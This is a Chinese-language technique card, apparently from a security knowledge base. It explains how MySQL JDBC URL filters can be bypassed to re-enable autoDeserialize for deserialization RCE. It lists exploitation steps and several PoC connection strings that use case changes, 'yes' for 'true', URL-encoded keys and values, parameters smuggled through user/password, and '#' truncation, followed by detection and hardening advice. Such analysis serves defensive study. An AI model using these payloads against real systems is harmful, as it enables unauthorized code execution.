---
id: web-java-deserialization-jdbc-url-waf-parser-bypass
title: JDBC URL WAF 绕过：利用驱动解码与参数解析差异绕过 autoDeserialize 过滤
type: scenario
domain: web
path: web/java/deserialization
technique: jdbc-url-waf-parser-bypass
aliases:
- JDBC WAF 绕过
- autoDeserialize 过滤绕过
- JDBC URL 编码绕过
- 井号截断 autoDeserialize=false
- 大小写绕过 autoDeserialize
- yes 代替 true
tags:
- java
- jdbc
- mysql
- waf-bypass
- parser-differential
- autodeserialize
- url-encoding
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:41:29+08:00'
  notes: 已对照原文与图03-12核对：yes 同义值（图03 allowable values true/false/yes/no）、URLDecoder 解码 value（图05/06）、user/password 注入（规则为?后均可控参数）、# 截断追加的 autoDeserialize=false（原文 URL 解析结果）、8.x key/value 双解码（图11 processKeyValuePattern）。注意：原文“大小写绕过”小节示例代码仍写 autoDeserialize（未真正改大小写），该子手法依赖驱动对属性名大小写归一，未在原文明确演示；卡已整体标 confidence=medium。PoC 未在本机执行；frontmatter 无 sources/source_url。
---

## 一句话结论

JDBC 连接串前置的 WAF 通常只按 `?`、`&`、`=` 做朴素分割并精确比较 `autoDeserialize=true`，而 MySQL 驱动会对参数名做归一、对 key/value 做 URL 解码，并支持 `yes` 等布尔同义词；利用这两套解析语义的差异，可用大小写、同义值、URL 编码、从其他可控参数注入以及 `#` 片段截断绕过过滤，重新打通 JDBC 反序列化 RCE。

## 原理

- 常见 WAF 解析：取 `url.split("\\?")[1]`，按 `&` 拆分，再按 `=` 拆 key/value，最后用 `key.equals("autoDeserialize")`、`value.equals("true")`（部分版本加 `yes`）做精确匹配。
- MySQL 驱动解析（6.x `ConnectionString.parseUrl`）：用 `StringTokenizer(paramString, "&")` 分割，用 `indexOfIgnoreCase(0, pair, "=")` 找等号，再用 `URLDecoder.decode(value, "UTF-8")` 对值解码；8.x `ConnectionUrlParser.processKeyValuePattern` 用正则取 key/value，并对 key 和 value 都调用 `decode()`。
- 两套解析的差异就是绕过面：WAF 看的是解码前的原始字符串，驱动看的是解码/归一化后的值；WAF 只检查 `extra` 参数，但 `user`、`password` 同样被拼接进查询串；WAF 只做子串匹配，不按 URL 片段语义理解 `#`。
- `BooleanPropertyDefinition.getAllowableValues()` 返回 `true/false/yes/no`，`parseObject` 中 `TRUE`/`YES` 不区分大小写，因此 `yes` 与 `true` 等价，而很多 WAF 只拦 `true`。
- `#` 在 URL 中开始 fragment。WAF 若强行在末尾追加 `autoDeserialize=false`，只要让最后一个可控参数以 `#` 结尾，驱动解析到 `#` 就停止，追加内容被当作片段丢弃，前面注入的 `autoDeserialize=true` 生效。

## 触发条件

- 存在 JDBC URL 接收点（数据库连接测试、数据源配置、报表/ETL 连接参数等），且 URL 或其中的 user/password/extra 参数可控。
- 前置 WAF/校验逻辑只做字符串或朴素参数匹配，且未在驱动解析后再次校验。
- 底层 MySQL 驱动允许 `autoDeserialize`（配合 `detectCustomCollations` 或 `ServerStatusDiffInterceptor`），目标可连接恶意 MySQL 服务端。
- 需要目标 classpath 有可用 gadget 才能到 RCE；否则仅能完成参数注入。

## 利用步骤

1. 先构造最直接的 `autoDeserialize=true`，观察被拦截还是被驱动接受，判断 WAF 的比较方式。
2. 依次尝试等价表示：改变 key 大小写；把 `true` 换成 `yes`；对 value 做 URL 编码。
3. 若 WAF 只检查某个参数（如 extra），把恶意参数塞进同样可控的 `user` 或 `password`，利用 `&` 拼接出新的参数。
4. 若 WAF 在末尾追加安全参数，在最后一个可控值末尾放 `#` 截断后续内容；必要时组合 `?` 与 `#` 控制解析边界。
5. 8.x 中对 key 也做 URL 编码，绕过对原始 URL 的整串 `contains("autoDeserialize")` 检查。

## PoC

大小写（WAF 精确匹配 `autoDeserialize` 时）：

```text
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autodeserialize=true&user=deser_CUSTOM
```

同义布尔值（WAF 只拦 `true`）：

```text
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=yes&user=deser_CUSTOM
```

URL 编码 value（6.x 驱动 `URLDecoder.decode` 后得到 true）：

```text
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=%74%72%75%65&user=deser_CUSTOM
```

从 user/password 注入（WAF 只检查 extra）：

```text
jdbc:mysql://127.0.0.1:3306/test?user=deser_CUSTOM&autoDeserialize=true&password=test&detectCustomCollations=true
```

`#` 截断 WAF 追加的 `autoDeserialize=false`（8.x）：

```text
jdbc:mysql://127.0.0.1:3306/test?user=deser_CUSTOM&password=test&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#?autoDeserialize=false
```

8.x key/value 都编码（WAF 对最终整串做 `contains("autoDeserialize")`）：

```text
jdbc:mysql://127.0.0.1:3306/test?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65=%74%72%75%65
```

以上均需配合恶意 MySQL 服务端返回序列化 gadget 才能弹出计算器；仅绕过参数校验不产生命令执行。

## 变体与关联

- 变体：WAF 若对每个参数都检查且不允许 `#`，6.x 在“最终完整 URL 再检查一次”的实现下原文认为无法绕过；8.x 仍可用 key 编码（因为 8.x 解码 key）。
- 变体：同样的解析差异可用于其他驱动参数，如 `allowLoadLocalInfile`、`socketFactory`、`queryInterceptors` 等危险属性。
- 关联：[[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]（本绕过所服务的底层反序列化链）。
- 关联：[[web-java-deser-fastjson-mysql-jdbc-autodeserialize]]（参数进入驱动的另一入口）。
- 边界：WAF 在驱动解析前对解码后的参数做检查、对 URL 结构做规范化、或直接禁止用户控制连接参数时，本组绕过不成立。

## 检测与防御

- 检测：连接串中出现 `%61%75%74%6f...` 等编码后的参数名、`autoDeserialize=yes`、大小写混写的属性名、参数值中的 `#`/`&`/`?`；同一请求在 user/password 位置出现额外 `&key=value`。
- 防御：不要用字符串匹配做 JDBC URL 安全校验；应由应用只接受白名单数据源与固定参数，完全禁止用户拼接连接串。
- 加固：在驱动解析后按属性白名单校验；升级驱动并关闭 `autoDeserialize`；限制出网到非预期数据库地址。
